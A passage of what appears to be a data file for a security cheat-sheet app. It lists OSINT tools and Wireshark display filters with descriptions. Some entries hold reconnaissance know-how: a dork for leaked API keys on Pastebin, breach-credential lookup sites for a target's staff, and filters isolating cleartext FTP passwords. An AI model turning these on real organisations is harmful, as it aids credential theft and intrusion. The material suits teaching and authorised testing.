    title: "DNSDumpster Web-Based Domain & Network Topology Mapping",
    command: "https://dnsdumpster.com/  # Enter domain: target-corp.lab",
    description:
      "A web-based DNS research tool that provides interactive maps, subdomain listings, MX/NS tables, and network infrastructure diagrams.",
    tags: ["dnsdumpster", "dns", "web-osint", "topology", "subdomains"],
  },
  {
    id: "osint-viewdns",
    tool: "ViewDNS.info",
    category: "OSINT & Info Gathering",
    title: "ViewDNS.info Web OSINT & Reverse Lookup Suite",
    command: "https://viewdns.info/  # Reverse IP, WHOIS history, DNS record checks",
    description:
      "A web-based suite of DNS tools including Reverse IP lookup, IP Location History, Reverse WHOIS, and Reverse MX queries.",
    tags: ["viewdns", "web-osint", "reverse-ip", "whois", "dns"],
  },
  {
    id: "osint-hunter-io",
    tool: "Hunter.io",
    category: "OSINT & Info Gathering",
    title: "Hunter.io Corporate Email & Employee Pattern Discovery",
    command: "https://hunter.io/search/target-corp.lab",
    description:
      "Online database lookup tool used to discover corporate email address formats, employee contact lists, and verified company domains.",
    tags: ["hunter-io", "emails", "corporate", "employees", "osint"],
  },
  {
    id: "osint-shodan-censys",
    tool: "Shodan & Censys",
    category: "OSINT & Info Gathering",
    title: "Shodan & Censys IoT Device & Vulnerability Search",
    command: "shodan search \"org:'Target Corp' port:22\"\n# OR visit https://censys.io",
    description:
      "Search engines designed to discover and monitor internet-connected devices, IoT systems, open ports, SSL/TLS certificates, and CVE vulnerabilities.",
    tags: ["shodan", "censys", "iot", "cve", "ports", "search-engine"],
  },
  {
    id: "osint-pastebin",
    tool: "Pastebin",
    category: "OSINT & Info Gathering",
    title: "Pastebin Public Text Leak Auditing",
    command: "site:pastebin.com \"target-corp.lab\" OR \"api_key\"",
    description:
      "Text-sharing website often indexed and audited for exposed credentials, database dumps, source code snippets, and API keys.",
    tags: ["pastebin", "leaks", "credentials", "api-keys", "osint"],
  },
  {
    id: "osint-intelx",
    tool: "IntelX",
    category: "OSINT & Info Gathering",
    title: "IntelX Intelligence Search & Dark Web Breach Archive",
    command: "https://intelx.io/  # Search domain, selector, or email address",
    description:
      "An OSINT search engine and archive that indexes historical data breaches, dark web leaks, paste sites, and hacking forums.",
    tags: ["intelx", "intelligence", "darkweb", "breaches", "leaks"],
  },
  {
    id: "osint-leakpeek",
    tool: "LeakPeek",
    category: "OSINT & Info Gathering",
    title: "LeakPeek Credential Breach Lookup Aggregator",
    command: "https://leakpeek.com/  # Query username, email, or domain",
    description:
      "A credential breach aggregator used to check if target corporate usernames, emails, or hashed passwords have been leaked in database breaches.",
    tags: ["leakpeek", "breach", "passwords", "credentials", "osint"],
  },
  {
    id: "osint-proxynova-comb",
    tool: "ProxyNova (COMB)",
    category: "OSINT & Info Gathering",
    title: "ProxyNova COMB (Combination Of Many Breaches) Query",
    command: "https://www.proxynova.com/comb/  # Search COMB dataset",
    description:
      "An online database search tool containing an aggregated dataset of over 3.2 billion leaked credentials from historical internet data breaches.",
    tags: ["proxynova", "comb", "breaches", "credentials", "database"],
  },

  // ==========================================
  // WIRESHARK & PACKET ANALYSIS (PDF LESSON)
  // ==========================================
  {
    id: "ws-ip-addr",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter All Traffic for Specific IP Address",
    command: "ip.addr == 192.168.244.129",
    description:
      "Shows all packets where the specified IP is either the source or destination host.",
    flagsBreakdown: [
      { flag: "ip.addr == <IP>", description: "Matches packets where source or destination IP matches value" },
    ],
    tags: ["wireshark", "ip", "filter", "pcap", "network"],
  },
  {
    id: "ws-ip-src",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter Packets by Source IP Address",
    command: "ip.src == 192.168.244.129",
    description:
      "Shows packets originating strictly from the specified source IP address.",
    flagsBreakdown: [
      { flag: "ip.src == <IP>", description: "Matches packets originating from specified IP" },
    ],
    tags: ["wireshark", "ip", "source", "filter", "pcap"],
  },
  {
    id: "ws-ip-dst",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter Packets by Destination IP Address",
    command: "ip.dst == 192.168.244.129",
    description:
      "Shows packets sent directly to the specified destination IP address.",
    flagsBreakdown: [
      { flag: "ip.dst == <IP>", description: "Matches packets destined for specified IP" },
    ],
    tags: ["wireshark", "ip", "destination", "filter", "pcap"],
  },
  {
    id: "ws-eth-addr",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter Packets by MAC Address (Ethernet Layer)",
    command: "eth.addr == 00:0c:29:ba:0e:20  # OR eth.addr == 00:50:56:e0:bd:4e",
    description:
      "Shows packets involving a specific physical MAC address on the Data Link layer.",
    flagsBreakdown: [
      { flag: "eth.addr == <MAC>", description: "Matches packets with source or destination MAC address" },
    ],
    tags: ["wireshark", "mac", "ethernet", "layer2", "pcap"],
  },
  {
    id: "ws-eth-src",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter Source MAC Address (Identify IP by MAC)",
    command: "eth.src == 00:50:56:e0:bd:4e",
    description:
      "Filters packets originating from a specific MAC address (used to trace unknown IPs to physical interfaces).",
    flagsBreakdown: [
      { flag: "eth.src == <MAC>", description: "Matches packets originating from specific hardware MAC" },
    ],
    tags: ["wireshark", "mac", "source", "ethernet", "trace"],
  },
  {
    id: "ws-eth-dst-broadcast",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter Network-Wide Broadcast Traffic",
    command: "eth.dst == ff:ff:ff:ff:ff:ff",
    description:
      "Filters network-wide Ethernet broadcast traffic (such as ARP requests and DHCP discoveries).",
    tags: ["wireshark", "broadcast", "ethernet", "arp", "dhcp"],
  },
  {
    id: "ws-ip-src-range",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter Traffic from Source IP Address Range",
    command: "ip.src >= 192.168.0.1 && ip.src <= 192.168.0.255",
    description:
      "Filters traffic originating from a specific contiguous range of source IP addresses.",
    tags: ["wireshark", "ip-range", "subnet", "source", "pcap"],
  },
  {
    id: "ws-ip-dst-range",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter Traffic to Destination IP Address Range",
    command: "ip.dst >= 10.0.0.1 && ip.dst <= 10.0.0.255",
    description:
      "Filters traffic sent directly to a specific range of destination IP addresses.",
    tags: ["wireshark", "ip-range", "destination", "pcap", "network"],
  },
  {
    id: "ws-ip-cidr-subnet",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter Traffic within Private CIDR Subnet",
    command: "ip.addr == 172.16.0.0/12  # OR ip.addr == 172.29.96.0/24",
    description:
      "Filters traffic within a specific private subnet using CIDR notation.",
    tags: ["wireshark", "cidr", "subnet", "ip", "pcap"],
  },
  {
    id: "ws-ip-exclude-range",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Exclude Specific IP Address Range",
    command: "!(ip.addr >= 192.168.1.1 && ip.addr <= 192.168.1.255)",
    description:
      "Excludes packets originating from or destined to a specific range of IP addresses.",
    tags: ["wireshark", "exclude", "ip-range", "filter", "pcap"],
  },
  {
    id: "ws-tcp-port-80",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter TCP Port 80 (Cleartext HTTP)",
    command: "tcp.port == 80",
    description:
      "Shows packets using TCP port 80, isolating standard HTTP web request and response traffic.",
    tags: ["wireshark", "http", "port80", "tcp", "web"],
  },
  {
    id: "ws-udp-port-53",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter UDP Port 53 (DNS Queries)",
    command: "udp.port == 53",
    description:
      "Shows packets using UDP port 53, isolating Domain Name System queries and response packets.",
    tags: ["wireshark", "dns", "port53", "udp", "queries"],
  },
  {
    id: "ws-port-443",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter Port 443 HTTPS (TCP or UDP/QUIC)",
    command: "tcp.port == 443 || udp.port == 443",
    description:
      "Shows packets using port 443 on either TCP (TLS/SSL HTTPS) or UDP (HTTP/3 QUIC).",
    tags: ["wireshark", "https", "port443", "tls", "ssl", "quic"],
  },
  {
    id: "ws-ip-src-port80",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter TCP Port 80 Traffic from Specific Source IP",
    command: "ip.src == 192.168.244.129 && tcp.port == 80",
    description:
      "Shows TCP web traffic on port 80 originating strictly from the specified source IP.",
    tags: ["wireshark", "http", "source", "ip", "logical-and"],
  },
  {
    id: "ws-http-or-dns",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Logical OR Protocol Filter (HTTP or DNS)",
    command: "http || dns",
    description:
      "Shows packets matching either HTTP web protocol or DNS domain resolution protocol.",
    tags: ["wireshark", "http", "dns", "logical-or", "protocols"],
  },
  {
    id: "ws-exclude-ip",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Exclude All Packets Involving Specific IP",
    command: "!ip.addr == 192.168.244.129",
    description:
      "Shows all captured packets except those involving the specified IP as source or destination.",
    tags: ["wireshark", "exclude", "ip", "not-operator", "pcap"],
  },
  {
    id: "ws-tcp-seq-raw",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter Packets by Raw TCP Sequence Number",
    command: "tcp.seq_raw == 123456789",
    description:
      "Filters packets matching an exact 32-bit raw TCP sequence number for session tracking and stream reconstruction.",
    tags: ["wireshark", "tcp", "sequence", "seq_raw", "streams"],
  },
  {
    id: "ws-tcp-nonzero-len",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter Non-Zero TCP Payload Packets",
    command: "!(tcp.len == 0)",
    description:
      "Excludes packets with zero TCP payload length (filters out empty TCP ACKs, SYN/FIN handshake frames, and keep-alives).",
    tags: ["wireshark", "tcp", "payload", "length", "filter"],
  },
  {
    id: "ws-tcp-len-large",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter Large TCP Payload Packets (File Transfers)",
    command: "tcp.len > 1000",
    description:
      "Filters packets with a TCP payload size greater than 1000 bytes (helps isolate bulk file transfers, downloads, or exfiltration).",
    tags: ["wireshark", "tcp", "large-packets", "file-transfer", "exfiltration"],
  },
  {
    id: "ws-tcp-dup-ack",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Identify Duplicate TCP Acknowledgment Packets",
    command: "tcp.analysis.duplicate_ack",
    description:
      "Identifies duplicate TCP acknowledgment packets (indicates potential packet loss, network congestion, or out-of-order delivery).",
    tags: ["wireshark", "tcp", "duplicate-ack", "packet-loss", "network-troubleshooting"],
  },
  {
    id: "ws-tcp-flags-rst-ack",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter TCP Packets with RST-ACK Flags (0x14)",
    command: "tcp.flags == 0x14",
    description:
      "Filters packets with both the RST (Reset) and ACK (Acknowledgment) flags set (sent to abruptly refuse/reset an active connection).",
    flagsBreakdown: [
      { flag: "0x14", description: "Binary 00010100 (RST flag bit 3 + ACK flag bit 4)" },
    ],
    tags: ["wireshark", "tcp", "flags", "rst", "ack", "connection-reset"],
  },
  {
    id: "ws-tcp-flags-syn",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter TCP SYN Packets (Connection Init / SYN Scan)",
    command: "tcp.flags == 0x02",
    description:
      "Filters packets with only the SYN flag set (used to detect new TCP connection initiations or Nmap SYN port scans).",
    flagsBreakdown: [
      { flag: "0x02", description: "Binary 00000010 (SYN flag bit 1)" },
    ],
    tags: ["wireshark", "tcp", "syn", "syn-scan", "port-scan"],
  },
  {
    id: "ws-tcp-flags-syn-ack",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter TCP SYN-ACK Response Packets (0x12)",
    command: "tcp.flags == 0x12",
    description:
      "Filters packets with SYN and ACK flags set (sent by servers to accept incoming TCP connection requests).",
    flagsBreakdown: [
      { flag: "0x12", description: "Binary 00010010 (SYN flag bit 1 + ACK flag bit 4)" },
    ],
    tags: ["wireshark", "tcp", "syn-ack", "handshake", "open-ports"],
  },
  {
    id: "ws-tcp-flags-rst",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter Packets with Only RST Flag Set (0x04)",
    command: "tcp.flags == 0x04",
    description:
      "Filters packets with only the RST flag set (indicates forced connection termination by host or firewall).",
    flagsBreakdown: [
      { flag: "0x04", description: "Binary 00000100 (RST flag bit 2)" },
    ],
    tags: ["wireshark", "tcp", "rst", "reset", "firewall"],
  },
  {
    id: "ws-frame-contains-login",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Search Raw Packet Frame Content for 'login'",
    command: "frame contains \"login\"",
    description:
      "Searches the raw packet frame payload bytes for the text string 'login'.",
    tags: ["wireshark", "search", "frame", "contains", "credentials"],
  },
  {
    id: "ws-frame-contains-admin",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Search Raw Packet Payload for 'admin'",
    command: "frame contains \"admin\"",
    description:
      "Searches raw packet payload data for the string 'admin' to locate privileged sessions or administrative access endpoints.",
    tags: ["wireshark", "search", "frame", "admin", "payload"],
  },
  {
    id: "ws-http-contains-useragent",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter HTTP Packets Containing 'User-Agent' Header",
    command: "http contains \"User-Agent\"",
    description:
      "Filters HTTP packets that contain the header field 'User-Agent' to inspect browser signatures or custom tools.",
    tags: ["wireshark", "http", "user-agent", "header", "web"],
  },
  {
    id: "ws-dns-dhcp",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter DNS Queries & DHCP Traffic",
    command: "dns\n# OR DHCP traffic: udp.port == 67 || udp.port == 68",
    description:
      "Isolates DNS queries/responses (`dns`) or DHCP Bootstrap Protocol leases on UDP ports 67/68 (`udp.port == 67 || udp.port == 68`).",
    tags: ["wireshark", "dns", "dhcp", "udp", "bootstrap"],
  },
  {
    id: "ws-ftp-traffic",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter FTP Control Traffic & Cleartext Credentials",
    command: "ftp\n# USER command: ftp.request.command == \"USER\"\n# PASS command: ftp.request.command == \"PASS\"\n# Login Success: ftp.response.code == 230\n# Features Check: ftp.request.command == \"FEAT\"",
    description:
      "Isolates unencrypted FTP authentication commands (`USER`, `PASS`), successful login responses (`230`), and feature queries (`FEAT`).",
    flagsBreakdown: [
      { flag: "ftp.request.command == \"USER\"", description: "Isolate FTP login username submissions" },
      { flag: "ftp.request.command == \"PASS\"", description: "Isolate FTP password submissions in cleartext" },
      { flag: "ftp.response.code == 230", description: "Filter successful FTP login responses" },
    ],
    tags: ["wireshark", "ftp", "credentials", "passwords", "cleartext"],
  },
  {
    id: "ws-http-status-codes",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter HTTP Status Codes (200 OK, 404 Not Found, 500 Error)",
    command: "http\n# OK: http.response.code == 200\n# Not Found: http.response.code == 404\n# Server Error: http.response.code == 500",
    description:
      "Filters HTTP web traffic by server response code to identify successful access (200), directory bruteforce misses (404), or application crashes (500).",
    tags: ["wireshark", "http", "status-code", "200", "404", "500"],
  },
  {
    id: "ws-arp-traffic",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter Address Resolution Protocol (ARP Request / Reply)",
    command: "arp\n# Requests: arp.opcode == 1\n# Replies: arp.opcode == 2",
    description:
      "Filters ARP traffic and isolates ARP Request packets (`opcode == 1`) vs ARP Reply packets (`opcode == 2`) to detect ARP poisoning or MAC spoofing.",
    tags: ["wireshark", "arp", "opcode", "spoofing", "poisoning"],
  },
  {
    id: "ws-smb-email",
    tool: "Wireshark / TShark",
    category: "Wireshark & Packet Analysis",
    title: "Filter SMB File Sharing & Email Protocols (SMTP/POP/IMAP)",
    command: "smb || smb2\n# Email: smtp || pop || imap",
    description:
      "Isolates Server Message Block traffic (`smb || smb2`) for Windows file sharing, or email protocol traffic (`smtp || pop || imap`).",
    tags: ["wireshark", "smb", "smb2", "smtp", "pop3", "imap", "email"],
  },
];
